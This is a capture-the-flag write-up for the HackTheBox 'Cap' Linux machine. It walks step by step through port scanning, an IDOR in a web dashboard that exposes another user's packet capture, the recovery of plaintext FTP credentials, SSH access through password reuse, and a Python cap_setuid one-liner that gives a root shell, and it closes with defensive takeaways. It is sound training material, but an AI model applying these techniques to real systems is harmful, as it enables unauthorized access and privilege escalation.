# HTB — "Cap" (Linux)

**Category:** Linux  
**Difficulty:** Easy

---

## Challenge Description

> Cap is an Easy difficulty Linux machine that features a website that allows us to run some common networking commands and capture packets in the process. It is observed that a parameter is vulnerable to Insecure Direct Object Reference (IDOR), which allows us to download the pcap file of other users' activity. This file contains the FTP credentials of a user, which have been reused as system credentials, giving access to the box over SSH. Enumeration of SUID binaries shows that python3.8 has the SYS_SETUID capability set, due to which, spawning a bash shell with Python gives us a shell as the root user.

The target is exposed as a standard HTB VPN machine:

```text
10.129.199.212
```

---

## Tooling

- `nmap` — port/service discovery
- A browser / `curl` — web app enumeration
- `tshark` — pcap analysis
- `ssh` — remote access
- `python3.8` (on-target) — capability abuse for privesc

---

## Recon: Port Scanning

A full TCP scan with `-Pn` (the host doesn't respond to ICMP by default) reveals three open ports:

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.129.199.212
```

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

**Task 1 — How many TCP ports are open?**
→ **3**

---

## Enumerating the Web App — A "Security Dashboard"

Browsing to `http://10.129.199.212/` shows a "Security Dashboard" belonging to a user named **Nathan**, with a sidebar offering:

```text
/capture    Security Snapshot (5 Second PCAP + Analysis)
/ip         IP Config
/netstat    Network Status
```

Clicking **Security Snapshot** triggers a server-side packet capture and redirects the browser to a results page.

**Task 2 — After running a "Security Snapshot", what is the `[something]` in `/[something]/[id]`?**
→ **`data`** (e.g. `/data/0`)

That page shows packet statistics for the scan and a **Download** button pointing to `/download/<id>` — the actual pcap file.

### IDOR on the scan ID

The `id` in `/data/<id>` is not bound to the session — it is a simple incrementing integer with no ownership check. Requesting a lower ID (such as `0`, the very first scan ever run on the box) returns **another user's scan**, i.e. Nathan's.

**Task 3 — Are you able to get to other users' scans?**
→ **Yes** (confirmed IDOR: any session can request any scan ID, e.g. `/data/0`)

```bash
curl --max-time 15 -o 0.pcap http://10.129.199.212/download/0
file 0.pcap
# 0.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1)
```

**Task 4 — What is the ID of the PCAP file that contains sensitive data?**
→ **0**

---

## Analyzing the Captured Traffic

Filtering the capture for FTP traffic with `tshark` exposes a full login in the clear:

```bash
tshark -r 0.pcap -Y "ftp"
```

```text
Request: USER nathan
Response: 331 Please specify the password.
Request: PASS Buck3tH4TF0RM3!
Response: 230 Login successful.
```

**Task 5 — Which application layer protocol in the pcap file can the sensitive data be found in?**
→ **FTP** (credentials are transmitted in plaintext, unlike SFTP/FTPS)

---

## Initial Access — Password Reuse

The admin reused the FTP password for their actual system (SSH) account:

```bash
ssh nathan@10.129.199.212
# Password: Buck3tH4TF0RM3!
```

**Task 6 — On what other service does nathan's FTP password work?**
→ **SSH**

This grants an interactive shell as `nathan`:

```bash
nathan@cap:~$ cat ~/user.txt
HTB{REDACTED}
```

**Submit User Flag**
→ `HTB{REDACTED}`

---

## Privilege Escalation — Abusing Linux Capabilities

Rather than hunting for SUID binaries, this box requires checking for **file capabilities**, since the web app's packet-capture feature needs elevated privileges to sniff raw traffic:

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid+eip` on the Python interpreter means it can call `setuid()` to become **any** UID, including root — a direct privilege escalation primitive.

**Task 8 — What is the full path to the binary with special capabilities that can be abused for root?**
→ **`/usr/bin/python3.8`**

### Exploitation

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```text
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cat /root/root.txt
HTB{REDACTED}
```

**Submit Root Flag**
→ `HTB{REDACTED}`

---

## Takeaways

- An endpoint that takes a resource ID directly from the URL path (`/data/<id>`) without checking that the requesting user actually owns that resource is a textbook **IDOR**. Incrementing/decrementing the ID is enough to walk through other users' data — here, another user's network capture.
- Packet captures (`.pcap`) frequently leak credentials when legacy plaintext protocols like **FTP, Telnet, or HTTP Basic Auth** are involved. Always grep/filter captured traffic for these protocols first.
- **Password reuse** across services (FTP → SSH) turns a low-impact info leak into full initial access. This is one of the most common real-world escalation paths from "we found some creds" to "we have a shell."
- `getcap -r /` should be a standard enumeration step alongside `find / -perm -4000` (SUID). Linux capabilities can grant equivalent (or greater) power than SUID bits while being far less commonly checked by defenders — and by less experienced attackers.
- `cap_setuid` on an interpreter like Python is especially dangerous: it turns a "scripting language with elevated capability" into an instant root shell via a one-liner, with no compiled exploit needed.
